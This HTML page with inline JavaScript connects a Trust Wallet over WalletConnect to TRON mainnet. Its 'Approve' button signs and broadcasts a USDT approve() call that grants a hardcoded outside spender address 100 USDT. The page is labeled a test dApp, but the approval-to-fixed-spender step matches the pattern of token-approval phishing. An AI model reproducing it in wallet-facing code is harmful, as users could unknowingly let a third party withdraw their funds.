<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TRON WalletConnect</title>
</head>
<body>

<button id="connect">Connect Trust Wallet</button>
<button id="approve">Approve</button>

<script type="module">

import { TronWeb } from "https://esm.sh/tronweb";
import {
  WalletConnectWallet
} from "https://esm.sh/@tronweb3/walletconnect-tron";

const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io"
});

let wallet;
let address;

const PROJECT_ID = "f17454bec6a9751e56d465e2a8b965b0";

document.getElementById("connect").onclick = async () => {

  wallet = new WalletConnectWallet({
    network: "Mainnet",
    options: {
      projectId: PROJECT_ID,
      metadata: {
        name: "My TRON dApp",
        description: "Test dApp",
        url: window.location.origin,
        icons: []
      }
    }
  });

  await wallet.connect();

  address = wallet.address;

  console.log("Connected:", address);

  alert("Connected: " + address);
};

document.getElementById("approve").onclick = async () => {

  const usdt = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

  const spender = "TKKbs29zGP9DaopabNjTGqbvjLhU6bW1fD";

  const amount = 100n * 1_000_000n;

  const { transaction } =
    await tronWeb.transactionBuilder.triggerSmartContract(
      usdt,
      "approve(address,uint256)",
      {
        feeLimit: 200000000
      },
      [
        {
          type: "address",
          value: spender
        },
        {
          type: "uint256",
          value: amount.toString()
        }
      ],
      address
    );

  const signedTx =
    await wallet.signTransaction(transaction);

  console.log(signedTx);

  const receipt =
    await tronWeb.trx.sendRawTransaction(signedTx);

  console.log(receipt);

  alert("Done");
};

</script>

</body>
</html>
